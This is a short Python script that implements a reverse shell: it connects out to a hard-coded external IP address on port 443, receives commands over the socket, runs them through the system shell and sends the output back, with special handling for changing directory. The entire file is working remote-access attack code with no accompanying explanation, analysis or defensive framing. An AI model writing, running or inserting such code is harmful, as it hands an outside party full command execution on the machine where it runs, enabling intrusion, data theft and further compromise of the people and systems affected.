import socket
import subprocess
import os

def connect_to_server(server_ip, server_port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((server_ip, server_port))

    while True:
        command = client.recv(1024).decode()
        if command.lower() == "exit":
            break
        if command.startswith("cd "):  # Handle change directory command
            try:
                os.chdir(command.strip("cd "))
                client.send(b"Changed directory")
            except FileNotFoundError as e:
                client.send(str(e).encode())
        else:
            output = subprocess.run(command, shell=True, capture_output=True)
            client.send(output.stdout + output.stderr)

    client.close()

if __name__ == "__main__":
    connect_to_server("96.85.137.37", 443)
